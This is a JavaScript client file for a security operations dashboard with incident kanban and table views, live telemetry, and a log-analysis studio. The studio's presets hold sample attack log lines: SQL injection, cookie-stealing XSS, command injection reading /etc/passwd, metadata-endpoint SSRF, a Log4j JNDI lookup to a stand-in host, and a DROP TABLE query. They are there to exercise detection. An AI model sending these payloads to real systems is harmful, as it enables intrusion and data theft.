// Aapki Nazar SOC Client Application
let currentIncidents = [];
let activeIncident = null;
let socket = null;
let currentView = "view-dashboard";
let isKanbanView = true;
let simulatorRunning = false;

// ── INIT ON DOM READY ──
document.addEventListener("DOMContentLoaded", async () => {
  initNavigation();
  initSocket();
  if (window.initCharts) window.initCharts();
  initModals();
  initPresets();
  initChaosToggle();
  initKanbanDragAndDrop();
  initRulesCatalog();

  // Load initial data
  await refreshDashboard();
  await refreshIncidents();
  await checkSimulatorState();
  if (window.lucide) lucide.createIcons();
});

// ── NAVIGATION CONTROLLER ──
function initNavigation() {
  const navItems = document.querySelectorAll(".nav-item[data-view]");
  navItems.forEach(item => {
    item.addEventListener("click", () => {
      const targetView = item.getAttribute("data-view");
      switchView(targetView);
    });
  });

  // Table vs Kanban switcher
  document.getElementById("view-kanban-toggle")?.addEventListener("click", () => {
    isKanbanView = true;
    document.getElementById("incidents-kanban-view").style.display = "grid";
    document.getElementById("incidents-table-view").style.display = "none";
    document.getElementById("view-kanban-toggle").className = "btn btn-primary btn-sm";
    document.getElementById("view-table-toggle").className = "btn btn-secondary btn-sm";
  });

  document.getElementById("view-table-toggle")?.addEventListener("click", () => {
    isKanbanView = false;
    document.getElementById("incidents-kanban-view").style.display = "none";
    document.getElementById("incidents-table-view").style.display = "block";
    document.getElementById("view-kanban-toggle").className = "btn btn-secondary btn-sm";
    document.getElementById("view-table-toggle").className = "btn btn-primary btn-sm";
  });

  // Search input
  document.getElementById("search-input")?.addEventListener("input", (e) => {
    filterIncidents(e.target.value);
  });

  // Clear stream button
  document.getElementById("clear-stream-btn")?.addEventListener("click", () => {
    const stream = document.getElementById("terminal-stream");
    if (stream) stream.innerHTML = '<div class="log-line" style="color:var(--text-muted);">[SYSTEM] Telemetry buffer cleared.</div>';
  });

  // Export CSV button
  document.getElementById("export-csv-btn")?.addEventListener("click", () => {
    window.location.href = "/incidents/export/csv";
    showToast("Exporting incident audit stream to CSV...", "info");
  });
}

function switchView(viewId) {
  currentView = viewId;
  document.querySelectorAll(".view-panel").forEach(p => p.classList.remove("active"));
  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));

  const targetPanel = document.getElementById(viewId);
  const targetNav = document.querySelector(`.nav-item[data-view="${viewId}"]`);

  if (targetPanel) targetPanel.classList.add("active");
  if (targetNav) targetNav.classList.add("active");

  const titleMap = {
    "view-dashboard": "Executive Telemetry",
    "view-telemetry": "Live Telemetry Ingestion Matrix",
    "view-incidents": "Incident Command Center",
    "view-studio": "Universal Threat Studio",
    "view-rules": "Active Threat Signatures"
  };

  const titleElem = document.getElementById("current-view-title");
  if (titleElem) titleElem.textContent = titleMap[viewId] || "Aapki Nazar SOC";
}

// ── REAL-TIME WEBSOCKETS (SOCKET.IO) ──
function initSocket() {
  try {
    socket = io();

    socket.on("connect", () => {
      const ind = document.getElementById("connection-indicator");
      if (ind) {
        ind.textContent = "● SOCKET CONNECTED";
        ind.className = "badge badge-low";
      }
    });

    socket.on("disconnect", () => {
      const ind = document.getElementById("connection-indicator");
      if (ind) {
        ind.textContent = "○ RECONNECTING...";
        ind.className = "badge badge-medium";
      }
    });

    // 1. Live Telemetry Stream Event
    socket.on("telemetry_stream", (data) => {
      appendTelemetryLog(data);
      if (window.pushRealtimeData) window.pushRealtimeData(data.stats);
    });

    // 2. Incident Created Event (Zero Latency)
    socket.on("incident_created", (incident) => {
      showToast(`🚨 New Incident: ${incident.title} (${incident.severity})`, incident.severity === "CRITICAL" ? "error" : "warning");
      refreshDashboard();
      refreshIncidents();
    });

    // 3. Incident Updated
    socket.on("incident_updated", () => {
      refreshDashboard();
      refreshIncidents();
    });

    // 4. Incident Deleted
    socket.on("incident_deleted", () => {
      refreshDashboard();
      refreshIncidents();
    });

    socket.on("dashboard_update_needed", () => {
      refreshDashboard();
    });
  } catch (err) {
    console.warn("Socket.io not reachable, using REST fallback:", err);
  }
}

// ── TELEMETRY STREAM RENDERER ──
function appendTelemetryLog(data) {
  const stream = document.getElementById("terminal-stream");
  if (!stream) return;

  const logRow = document.createElement("div");
  logRow.className = `log-line ${data.isThreat ? 'log-threat' : ''}`;

  const timeStr = new Date(data.timestamp).toLocaleTimeString();
  const geoText = data.geo ? `<span class="geo-tag">${data.geo.flag || ''} ${data.geo.code}</span> ` : "";

  logRow.innerHTML = `
    <span class="log-time">[${timeStr}]</span>
    <span class="log-ip">${geoText}${data.sourceIp || '10.0.0.1'}</span>
    <span class="log-text">${escapeHtml(data.raw)}</span>
    ${data.isThreat ? `<span class="threat-tag">${data.threatType} (${data.threatScore}/100)</span>` : ''}
  `;

  stream.appendChild(logRow);

  // Keep max 150 items to avoid DOM memory leak
  if (stream.children.length > 150) {
    stream.removeChild(stream.children[0]);
  }

  stream.scrollTop = stream.scrollHeight;
}

// ── DASHBOARD REFRESH ──
async function refreshDashboard() {
  try {
    const data = await api.getDashboard();

    document.getElementById("stat-active").textContent = (data.open || 0) + (data.inProgress || 0);
    document.getElementById("stat-total-sub").textContent = `Total tracked: ${data.total || 0}`;
    document.getElementById("stat-critical").textContent = data.critical || 0;
    document.getElementById("stat-sla").textContent = data.total === 0 ? "100%" : (data.analytics?.slaComplianceRate !== "N/A" && data.analytics?.slaComplianceRate !== undefined ? `${data.analytics.slaComplianceRate}%` : "100%");
    document.getElementById("stat-mttr").textContent = data.total === 0 ? "0m" : (data.analytics?.mttrMinutes !== "N/A" && data.analytics?.mttrMinutes !== undefined ? `${data.analytics.mttrMinutes}m` : "N/A");
    const statDetected = document.getElementById("stat-detected");
    if (statDetected) statDetected.textContent = data.analytics?.threatsDetected ?? (data.total || 0);

    const pill = document.getElementById("active-incidents-pill");
    if (pill) pill.textContent = (data.open || 0) + (data.inProgress || 0);

    // Health Score
    const score = data.healthScore?.score ?? 100;
    const badge = document.getElementById("health-score-badge");
    const label = document.getElementById("health-label");
    const sub = document.getElementById("health-sub");
    const iconWrap = document.getElementById("health-icon-wrap");

    if (badge) badge.textContent = `Score: ${score}/100`;

    if (score >= 85) {
      if (label) label.textContent = "Aapki Nazar Security Health Score: OPTIMAL";
      if (sub) sub.textContent = "All services operational within SLA parameters.";
      if (badge) badge.className = "badge badge-low";
      if (iconWrap) iconWrap.innerHTML = '<i data-lucide="shield-check" style="width:28px;height:28px;color:var(--status-resolved);"></i>';
    } else if (score >= 60) {
      if (label) label.textContent = "Aapki Nazar Security Health Score: ELEVATED RISK";
      if (sub) sub.textContent = "Unresolved high-priority threats pending containment.";
      if (badge) badge.className = "badge badge-medium";
      if (iconWrap) iconWrap.innerHTML = '<i data-lucide="shield-alert" style="width:28px;height:28px;color:var(--severity-high);"></i>';
    } else {
      if (label) label.textContent = "Aapki Nazar Security Health Score: SPECIAL GRADE THREAT";
      if (sub) sub.textContent = "Multiple critical security alerts active. Immediate intervention required.";
      if (badge) badge.className = "badge badge-critical";
      if (iconWrap) iconWrap.innerHTML = '<i data-lucide="shield-x" style="width:28px;height:28px;color:var(--severity-crit);"></i>';
    }
    
    if (window.lucide && iconWrap) lucide.createIcons({ root: iconWrap });

    if (window.updateCharts) {
      window.updateCharts(data);
    }
  } catch (err) {
    console.error("Failed to refresh dashboard:", err);
  }
}

// ── INCIDENTS CONTROLLER (KANBAN & TABLE) ──
async function refreshIncidents() {
  try {
    currentIncidents = await api.getIncidents();
    renderKanban(currentIncidents);
    renderTable(currentIncidents);
  } catch (err) {
    console.error("Failed to fetch incidents:", err);
  }
}

function renderKanban(incidents) {
  const colOpen = document.getElementById("col-open");
  const colProgress = document.getElementById("col-progress");
  const colResolved = document.getElementById("col-resolved");

  if (!colOpen || !colProgress || !colResolved) return;

  colOpen.innerHTML = "";
  colProgress.innerHTML = "";
  colResolved.innerHTML = "";

  let openCount = 0;
  let progressCount = 0;
  let resolvedCount = 0;

  incidents.forEach(inc => {
    const card = createKanbanCard(inc);
    if (inc.status === "OPEN") {
      colOpen.appendChild(card);
      openCount++;
    } else if (inc.status === "IN_PROGRESS" || inc.status === "INVESTIGATING") {
      colProgress.appendChild(card);
      progressCount++;
    } else {
      colResolved.appendChild(card);
      resolvedCount++;
    }
  });

  document.getElementById("cnt-col-open").textContent = openCount;
  document.getElementById("cnt-col-progress").textContent = progressCount;
  document.getElementById("cnt-col-resolved").textContent = resolvedCount;
  if (window.lucide) lucide.createIcons();
}

function createKanbanCard(inc) {
  const card = document.createElement("div");
  const sev = (inc.severity || "").toLowerCase();
  const sevBadge = sev === "critical" ? "badge-critical" : sev === "high" ? "badge-high" : sev === "medium" ? "badge-medium" : "badge-low";
  const sevCardClass = `sev-${sev}`;
  const criticalExtra = sev === "critical" ? " card-critical" : "";

  card.className = `kanban-card ${sevCardClass}${criticalExtra}`;
  card.setAttribute("draggable", "true");
  card.setAttribute("data-id", inc.incidentId);

  card.innerHTML = `
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:9px;">
      <span style="font-family:'JetBrains Mono',monospace;font-size:10.5px;font-weight:700;color:var(--violet-500);letter-spacing:0.04em;">${inc.incidentId}</span>
      <span class="badge ${sevBadge}">${inc.severity}</span>
    </div>
    <div style="font-weight:600;font-size:13px;color:var(--text-primary);margin-bottom:5px;line-height:1.4;">${escapeHtml(inc.title)}</div>
    <div style="font-size:12px;color:var(--text-tertiary);margin-bottom:12px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;line-height:1.55;">
      ${escapeHtml(inc.description || 'No description')}
    </div>
    <div style="display:flex;align-items:center;justify-content:space-between;padding-top:9px;border-top:1px solid var(--border-0);font-size:11px;">
      <span style="color:var(--text-secondary);display:flex;align-items:center;gap:4px;"><i data-lucide="user" style="width:11px;height:11px;"></i> ${escapeHtml(inc.assignedTo)}</span>
      <button class="btn btn-secondary btn-sm inspect-btn" style="padding:3px 8px;font-size:10.5px;">Inspect</button>
    </div>
  `;

  card.querySelector(".inspect-btn")?.addEventListener("click", (e) => {
    e.stopPropagation();
    openInspectorModal(inc);
  });

  card.addEventListener("click", () => openInspectorModal(inc));

  // Drag events
  card.addEventListener("dragstart", (e) => {
    card.classList.add("dragging");
    e.dataTransfer.setData("text/plain", inc.incidentId);
  });

  card.addEventListener("dragend", () => {
    card.classList.remove("dragging");
  });

  return card;
}

function renderTable(incidents) {
  const tbody = document.getElementById("incidents-table-body");
  if (!tbody) return;

  if (incidents.length === 0) {
    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:30px;color:var(--text-muted);">No matching incidents found.</td></tr>`;
    return;
  }

  tbody.innerHTML = incidents.map(inc => {
    const sevClass = inc.severity === "CRITICAL" ? "badge-critical" : inc.severity === "HIGH" ? "badge-high" : inc.severity === "MEDIUM" ? "badge-medium" : "badge-low";
    const statusClass = (inc.status === "RESOLVED" || inc.status === "CONTAINED") ? "status-resolved" : (inc.status === "IN_PROGRESS" || inc.status === "INVESTIGATING") ? "status-in_progress" : "status-open";

    return `
      <tr style="border-bottom:1px solid var(--border-subtle);cursor:pointer;" onclick="openIncidentById('${inc.incidentId}')">
        <td style="padding:14px 18px;font-family:'JetBrains Mono',monospace;font-weight:700;font-size:12px;">${inc.incidentId}</td>
        <td style="padding:14px 18px;">
          <div style="font-weight:600;color:var(--text-primary);">${escapeHtml(inc.title)}</div>
          <div style="font-size:11.5px;color:var(--text-muted);max-width:280px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(inc.description || '')}</div>
        </td>
        <td style="padding:14px 18px;"><span class="badge ${sevClass}">${inc.severity}</span></td>
        <td style="padding:14px 18px;"><span class="badge ${statusClass}">${inc.status.replace('_', ' ')}</span></td>
        <td style="padding:14px 18px;font-weight:600;font-size:12.5px;">${escapeHtml(inc.assignedTo)}</td>
        <td style="padding:14px 18px;font-family:'JetBrains Mono',monospace;font-size:11.5px;">${formatSla(inc.slaDeadline)}</td>
        <td style="padding:14px 18px;">
          <button class="btn btn-secondary btn-sm" onclick="event.stopPropagation(); openIncidentById('${inc.incidentId}')">Inspect</button>
        </td>
      </tr>
    `;
  }).join("");
}

function filterIncidents(term) {
  const lower = term.toLowerCase();
  const filtered = currentIncidents.filter(i => 
    i.incidentId.toLowerCase().includes(lower) ||
    i.title.toLowerCase().includes(lower) ||
    i.assignedTo.toLowerCase().includes(lower) ||
    (i.description || "").toLowerCase().includes(lower)
  );
  renderKanban(filtered);
  renderTable(filtered);
}

// ── KANBAN DRAG & DROP HANDLER ──
function initKanbanDragAndDrop() {
  const columns = document.querySelectorAll(".kanban-column");
  columns.forEach(col => {
    col.addEventListener("dragover", (e) => {
      e.preventDefault();
      col.style.background = "rgba(0, 229, 255, 0.05)";
    });

    col.addEventListener("dragleave", () => {
      col.style.background = "";
    });

    col.addEventListener("drop", async (e) => {
      e.preventDefault();
      col.style.background = "";
      const incidentId = e.dataTransfer.getData("text/plain");
      const newStatus = col.getAttribute("data-status");

      if (incidentId && newStatus) {
        try {
          await api.updateIncident(incidentId, { status: newStatus });
          showToast(`Moved ${incidentId} to ${newStatus}`, "success");
          refreshIncidents();
          refreshDashboard();
        } catch (err) {
          showToast(`Failed to update status: ${err.message}`, "error");
        }
      }
    });
  });
}

// ── MODALS & WAR ROOM CONTROLLER ──
function initModals() {
  // Tabs switcher
  document.querySelectorAll(".modal-tabs .tab-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const modal = btn.closest(".modal-dialog");
      modal.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
      modal.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));

      btn.classList.add("active");
      const targetTab = modal.querySelector(`#${btn.getAttribute("data-tab")}`);
      if (targetTab) targetTab.classList.add("active");
    });
  });

  // Close modals
  document.querySelectorAll("[data-close-modal]").forEach(btn => {
    btn.addEventListener("click", () => {
      const modalId = btn.getAttribute("data-close-modal");
      const modal = document.getElementById(modalId);
      if (modal) modal.style.display = "none";
    });
  });

  // Open Create Modal
  document.getElementById("open-create-btn")?.addEventListener("click", () => {
    document.getElementById("create-modal").style.display = "flex";
  });

  // Create Form Submit
  document.getElementById("create-form")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    const title = document.getElementById("create-title").value.trim();
    const description = document.getElementById("create-description").value.trim();
    const severity = document.getElementById("create-severity").value;
    const assignedTo = document.getElementById("create-assigned-to").value.trim();

    try {
      await api.createIncident({ title, description, severity, status: "OPEN", assignedTo });
      showToast("Incident created successfully", "success");
      document.getElementById("create-modal").style.display = "none";
      document.getElementById("create-form").reset();
      refreshDashboard();
      refreshIncidents();
    } catch (err) {
      showToast(`Error creating incident: ${err.message}`, "error");
    }
  });

  // Forensic Download Button
  document.getElementById("download-forensics-btn")?.addEventListener("click", () => {
    if (!activeIncident) return;
    const payload = activeIncident.payload || {
      incidentId: activeIncident.incidentId,
      title: activeIncident.title,
      severity: activeIncident.severity,
      description: activeIncident.description,
      createdAt: activeIncident.createdAt
    };

    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `Forensic_Report_${activeIncident.incidentId}.json`;
    a.click();
    URL.revokeObjectURL(url);
    showToast("Forensic Evidence report downloaded", "success");
  });

  // SOAR Automated Containment Button
  document.getElementById("execute-containment-btn")?.addEventListener("click", async () => {
    if (!activeIncident) return;
    try {
      const sourceIp = activeIncident.payload?.sourceIp || "unknown";
      if (sourceIp === "unknown") {
        showToast("Cannot contain: Unknown IP", "warning");
        return;
      }
      await api.containIncident(activeIncident.incidentId, sourceIp);
      await api.updateIncident(activeIncident.incidentId, { status: "RESOLVED" });
      showToast("Simulated Containment executed & incident resolved", "success");
      document.getElementById("inspector-modal").style.display = "none";
      refreshDashboard();
      refreshIncidents();
    } catch (err) {
      showToast(`Containment failed: ${err.message}`, "error");
    }
  });

  // Add Comment
  document.getElementById("submit-comment-btn")?.addEventListener("click", async () => {
    const input = document.getElementById("comment-input");
    const text = input.value.trim();
    if (!text || !activeIncident) return;

    try {
      await api.addComment(activeIncident.incidentId, text);
      input.value = "";
      const updated = await api.getIncidentById(activeIncident.incidentId);
      openInspectorModal(updated);
      showToast("Audit note posted", "success");
    } catch (err) {
      showToast(`Failed to post note: ${err.message}`, "error");
    }
  });
}

function openIncidentById(id) {
  const inc = currentIncidents.find(i => i.incidentId === id);
  if (inc) openInspectorModal(inc);
}
window.openIncidentById = openIncidentById;

function openInspectorModal(incident) {
  activeIncident = incident;
  const modal = document.getElementById("inspector-modal");
  if (!modal) return;

  document.getElementById("modal-incident-id").textContent = incident.incidentId;
  document.getElementById("modal-incident-title").textContent = incident.title;
  document.getElementById("modal-severity").textContent = incident.severity;
  document.getElementById("modal-severity").className = `badge ${incident.severity === 'CRITICAL' ? 'badge-critical' : incident.severity === 'HIGH' ? 'badge-high' : 'badge-low'}`;
  document.getElementById("modal-status").textContent = incident.status.replace('_', ' ');
  document.getElementById("modal-assignee").textContent = incident.assignedTo;
  document.getElementById("modal-sla").textContent = formatSla(incident.slaDeadline);

  let extraContext = ``;
  if (incident.riskLevel) {
    extraContext += `\nRisk Level: ${incident.riskLevel}`;
  }
  if (incident.mitreTechnique) {
    try {
      const mitre = typeof incident.mitreTechnique === 'string' ? JSON.parse(incident.mitreTechnique) : incident.mitreTechnique;
      if (mitre.id && mitre.name) {
        extraContext += `\nMITRE ATT&CK: ${mitre.id} - ${mitre.name} (${mitre.tactic || 'Unknown'})`;
      } else {
        extraContext += `\nMITRE ATT&CK: ${incident.mitreTechnique}`;
      }
    } catch {
      extraContext += `\nMITRE ATT&CK: ${incident.mitreTechnique}`;
    }
  }
  if (incident.hash) {
    extraContext += `\nForensic Hash: ${incident.hash}`;
  }
  if (incident.payload?.geo && incident.payload.geo.code !== "LOCAL") {
    extraContext += `\nSimulated Origin Region: ${incident.payload.geo.country} (${incident.payload.geo.city})`;
  }

  document.getElementById("modal-desc").textContent = (incident.description || "No context description provided.") + extraContext;

  // Forensic Evidence View
  const forensicCode = document.getElementById("modal-forensic-code");
  if (forensicCode) {
    forensicCode.textContent = JSON.stringify(incident.payload || {
      incidentId: incident.incidentId,
      threatType: incident.title,
      severity: incident.severity,
      description: incident.description,
      rootCause: incident.playbook?.rootCause || "Dynamic pattern match",
      hash: incident.hash || null
    }, null, 2);
  }

  // SOAR Playbook View
  const playbookWrap = document.getElementById("modal-playbook-content");
  if (playbookWrap) {
    if (incident.playbook) {
      playbookWrap.innerHTML = `
        <div style="font-weight:700;color:var(--accent-primary);margin-bottom:6px;">Summary</div>
        <div style="color:var(--text-secondary);font-size:13px;margin-bottom:12px;">${escapeHtml(incident.playbook.summary || '')}</div>
        <div style="font-weight:700;color:var(--accent-primary);margin-bottom:6px;">Likely Root Cause</div>
        <div style="color:var(--text-secondary);font-size:13px;margin-bottom:12px;">${escapeHtml(incident.playbook.rootCause || '')}</div>
        <div class="card-label">Recommended Remediation</div>
        <div class="code-snippet">${escapeHtml(incident.playbook.codeRemediation || incident.playbook.immediateAction || '')}</div>
      `;
    } else {
      playbookWrap.innerHTML = `<div style="text-align:center;padding:24px;color:var(--text-muted);">Standard playbook active. Use manual triage protocol.</div>`;
    }
  }

  // Timeline View
  const timelineStream = document.getElementById("modal-timeline-stream");
  if (timelineStream) {
    const timeline = incident.timeline || [];
    timelineStream.innerHTML = timeline.map(t => `
      <div style="background:rgba(0,0,0,0.3);padding:10px 14px;border-radius:var(--radius-sm);border-left:3px solid var(--accent-primary);">
        <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text-muted);margin-bottom:4px;">
          <span>${t.by || 'System'}</span>
          <span>${new Date(t.timestamp).toLocaleTimeString()}</span>
        </div>
        <div style="font-size:12.5px;color:var(--text-primary);">${escapeHtml(t.action)} ${t.note ? `: ${escapeHtml(t.note)}` : ''}</div>
      </div>
    `).join("");
  }

  modal.style.display = "flex";
}

// ── CHAOS GENERATOR & TRAFFIC SIMULATOR TOGGLE ──
function initChaosToggle() {
  const topBtn = document.getElementById("chaos-toggle-btn");
  const simBtn = document.getElementById("sim-start-stop-btn");
  
  const intervalSlider = document.getElementById("chaos-interval-slider");
  const attackSlider = document.getElementById("chaos-attack-slider");
  const intervalVal = document.getElementById("chaos-interval-val");
  const attackVal = document.getElementById("chaos-attack-val");

  if (intervalSlider) {
    intervalSlider.addEventListener("input", (e) => {
      if (intervalVal) intervalVal.textContent = `${e.target.value} ms`;
    });
    intervalSlider.addEventListener("change", (e) => {
      if (simulatorRunning) restartSimulatorQuietly();
    });
  }

  if (attackSlider) {
    attackSlider.addEventListener("input", (e) => {
      if (attackVal) attackVal.textContent = `${Math.round(e.target.value * 100)}%`;
    });
    attackSlider.addEventListener("change", (e) => {
      if (simulatorRunning) restartSimulatorQuietly();
    });
  }

  const restartSimulatorQuietly = async () => {
    try {
      await api.stopSimulator();
      const interval = intervalSlider ? parseInt(intervalSlider.value, 10) : 1500;
      const attackRatio = attackSlider ? parseFloat(attackSlider.value) : 0.35;
      await api.startSimulator(interval, attackRatio);
    } catch(err) {
      console.error(err);
    }
  };

  const toggle = async () => {
    try {
      if (simulatorRunning) {
        await api.stopSimulator();
        simulatorRunning = false;
        showToast("Chaos Engine Stopped", "warning");
      } else {
        const interval = intervalSlider ? parseInt(intervalSlider.value, 10) : 1500;
        const attackRatio = attackSlider ? parseFloat(attackSlider.value) : 0.35;
        await api.startSimulator(interval, attackRatio);
        simulatorRunning = true;
        showToast("Chaos Traffic Simulator Started ⚡", "success");
      }
      updateSimulatorButtons();
    } catch (err) {
      showToast(`Simulator error: ${err.message}`, "error");
    }
  };

  topBtn?.addEventListener("click", toggle);
  simBtn?.addEventListener("click", toggle);
}

async function checkSimulatorState() {
  try {
    const status = await api.getSimulatorStatus();
    simulatorRunning = !!status.isRunning;
    updateSimulatorButtons();
  } catch {}
}

function updateSimulatorButtons() {
  const topBtn = document.getElementById("chaos-toggle-btn");
  const simBtn = document.getElementById("sim-start-stop-btn");
  const pill = document.getElementById("sim-status-pill");
  const statusBadge = document.getElementById("chaos-status-badge");

  if (simulatorRunning) {
    if (topBtn) { topBtn.textContent = "⏹ Stop Traffic Simulator"; topBtn.className = "btn btn-secondary btn-sm"; }
    if (simBtn) { simBtn.textContent = "⏹ Stop Chaos Generator"; simBtn.className = "btn btn-secondary btn-sm"; }
    if (pill) { pill.textContent = "LIVE"; pill.style.color = "var(--status-resolved)"; }
    if (statusBadge) { statusBadge.textContent = "RUNNING"; statusBadge.className = "badge status-resolved"; }
  } else {
    if (topBtn) { topBtn.textContent = "▶ Start Traffic Simulator"; topBtn.className = "btn btn-danger btn-sm"; }
    if (simBtn) { simBtn.textContent = "▶ Start Chaos Generator"; simBtn.className = "btn btn-danger btn-sm"; }
    if (pill) { pill.textContent = "IDLE"; pill.style.color = "var(--text-muted)"; }
    if (statusBadge) { statusBadge.textContent = "IDLE"; statusBadge.className = "badge badge-low"; }
  }
}

// ── THREAT STUDIO & PRESET HANDLERS ──
function initPresets() {
  const presets = {
    sqli: `198.51.100.22 - - [${new Date().toISOString()}] "GET /api/users?id=1%20UNION%20SELECT%20null,password_hash%20FROM%20admin-- HTTP/1.1" 500 1024`,
    xss: `103.251.167.5 - - [${new Date().toISOString()}] "POST /comments HTTP/1.1" 201 450 - body: <script>alert(document.cookie)</script>`,
    cmdi: `192.168.1.100 - - [${new Date().toISOString()}] "POST /api/ping HTTP/1.1" 200 890 - body: {"host": "127.0.0.1; cat /etc/passwd"}`,
    ssrf: `10.0.0.50 - - [${new Date().toISOString()}] "POST /api/webhook HTTP/1.1" 200 300 - body: {"url": "http://169.254.169.254/latest/meta-data/"}`,
    splunk: `{"sourcetype": "stream:http", "src_ip": "10.0.1.25", "dest_ip": "10.0.2.50", "http_method": "POST", "uri_path": "/login", "bytes_out": 2345}`,
    log4j: `185.191.171.4 - - [${new Date().toISOString()}] "GET /login HTTP/1.1" 400 320 - User-Agent: \${jndi:ldap://badhost.com:1389/Exploit}`,
    entropy: `203.0.113.88 - - [${new Date().toISOString()}] "POST /eval HTTP/1.1" 200 4096 - payload: eval(base64_decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0'))`,
    json: JSON.stringify({
      eventVersion: "1.08",
      sourceIPAddress: "198.51.100.99",
      userAgent: "aws-sdk-go/1.44.0",
      requestParameters: { query: "DROP TABLE users;" },
      responseCode: 403
    }, null, 2),
    clean: `172.56.21.89 - - [${new Date().toISOString()}] "GET /api/v1/health HTTP/1.1" 200 42 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`
  };

  document.querySelectorAll(".preset-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const p = btn.getAttribute("data-preset");
      const textarea = document.getElementById("studio-log-input");
      if (textarea && presets[p]) {
        textarea.value = presets[p];
      }
    });
  });

  document.getElementById("studio-analyze-btn")?.addEventListener("click", async () => {
    const input = document.getElementById("studio-log-input");
    const raw = input.value.trim();
    if (!raw) {
      showToast("Please enter or paste a log string to analyze.", "warning");
      return;
    }

    try {
      const res = await api.analyzeLogs(raw);
      const detection = res.detection;
      const card = document.getElementById("studio-result-card");
      if (!card) return;

      document.getElementById("studio-threat-title").textContent = detection.type !== "none" ? detection.type : "No Threat Detected (Clean Traffic)";
      document.getElementById("studio-severity-badge").textContent = detection.severity;
      document.getElementById("studio-severity-badge").className = `badge ${detection.severity === 'CRITICAL' ? 'badge-critical' : detection.severity === 'HIGH' ? 'badge-high' : 'badge-low'}`;
      document.getElementById("studio-mitre-badge").textContent = detection.mitre ? `MITRE ${detection.mitre.id}` : "Clean Signature";
      document.getElementById("studio-score-badge").textContent = `Threat Score: ${detection.threatScore || 0}/100`;

      document.getElementById("diag-format").textContent = detection.normalizedLog?.format || "Unknown";
      document.getElementById("diag-ip").textContent = detection.normalizedLog?.sourceIp || "unknown";
      document.getElementById("diag-entropy").textContent = `${detection.entropy || 0} bits/char`;
      document.getElementById("diag-velocity").textContent = detection.velocity?.isAnomaly ? "ANOMALY (>35 req/10s)" : "Normal (<3 req/s)";
      document.getElementById("diag-velocity").style.color = detection.velocity?.isAnomaly ? "var(--severity-crit)" : "var(--status-resolved)";

      document.getElementById("diag-payload").textContent = detection.extractedPayload || detection.normalizedLog?.payload || "No suspicious payload extracted";

      const playbookSummary = document.getElementById("diag-playbook-summary");
      const playbookCode = document.getElementById("diag-playbook-code");

      if (detection.playbook) {
        playbookSummary.textContent = detection.playbook.summary;
        playbookCode.textContent = detection.playbook.codeRemediation || detection.playbook.immediateAction;
        document.getElementById("diag-playbook-wrap").style.display = "block";
      } else {
        playbookSummary.textContent = "Traffic verified safe. No automated remediation required.";
        playbookCode.textContent = "// Status: Verified Safe / No containment rule required";
      }

      card.style.display = "block";
      showToast(detection.status === "threat_detected" ? `Intercepted ${detection.type}!` : "Traffic analyzed: Clean", detection.status === "threat_detected" ? "warning" : "success");
    } catch (err) {
      showToast(`Analysis failed: ${err.message}`, "error");
    }
  });

  document.getElementById("studio-clear-btn")?.addEventListener("click", () => {
    document.getElementById("studio-log-input").value = "";
    document.getElementById("studio-result-card").style.display = "none";
  });
}

// ── SIGNATURE RULES CATALOG VIEW ──
async function initRulesCatalog() {
  const container = document.getElementById("rules-catalog-list");
  if (!container) return;
  while (container.children.length >= 4) { container.removeChild(container.firstChild); }

  try {
    const rulesConfig = await api.getRules();
    // Use the custom_rules array if available, otherwise assume it's a flat array or fallback
    const rules = Array.isArray(rulesConfig) ? rulesConfig : (rulesConfig.custom_rules || []);

    if (rules.length === 0) {
      container.innerHTML = `<div style="text-align:center;padding:30px;color:var(--text-muted);">No detection rules found.</div>`;
      return;
    }

    container.innerHTML = rules.map(r => `
      <div style="background:rgba(8,12,22,0.8);border:1px solid var(--border-subtle);border-radius:var(--radius-sm);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:8px;">
        <div style="display:flex;align-items:center;gap:12px;">
          <span style="font-family:'JetBrains Mono',monospace;font-weight:700;font-size:12px;color:var(--accent-primary);">${escapeHtml(r.id)}</span>
          <div>
            <div style="font-weight:600;font-size:13px;">${escapeHtml(r.type || r.pattern)}</div>
            <div style="font-size:11.5px;color:var(--text-muted);">${escapeHtml(r.description || '')}</div>
          </div>
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          ${r.mitreTechniqueId ? `<span class="badge badge-low">MITRE ${escapeHtml(r.mitreTechniqueId)}</span>` : r.mitre ? `<span class="badge badge-low">MITRE ${escapeHtml(r.mitre.id)}</span>` : ''}
          <span class="badge ${r.severity === 'CRITICAL' ? 'badge-critical' : r.severity === 'HIGH' ? 'badge-high' : r.severity === 'LOW' ? 'badge-low' : 'badge-medium'}">${r.severity || 'MEDIUM'}</span>
        </div>
      </div>
    `).join("");
  } catch (err) {
    console.error("Rules catalog error:", err);
    container.innerHTML = `<div style="color:var(--severity-crit);">Failed to load rules: ${err.message}</div>`;
  }
}

// ── UTILITY HELPERS ──
function showToast(message, type = "info") {
  const container = document.getElementById("toast-container");
  if (!container) return;

  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  const icon = type === 'error' ? 'x-circle' : type === 'success' ? 'check-circle-2' : 'info';
  const color = type === 'error' ? 'var(--severity-crit)' : type === 'success' ? 'var(--status-resolved)' : 'var(--accent-primary)';
  toast.innerHTML = `<i data-lucide="${icon}" style="width:18px;height:18px;color:${color};flex-shrink:0;"></i> <span>${escapeHtml(message)}</span>`;

  container.appendChild(toast);
  if (window.lucide) lucide.createIcons();

  setTimeout(() => {
    toast.style.opacity = "0";
    toast.style.transform = "translateX(20px)";
    toast.style.transition = "all 0.3s ease";
    setTimeout(() => toast.remove(), 300);
  }, 4000);
}

function formatSla(deadline) {
  if (!deadline) return "—";
  const diff = new Date(deadline).getTime() - Date.now();
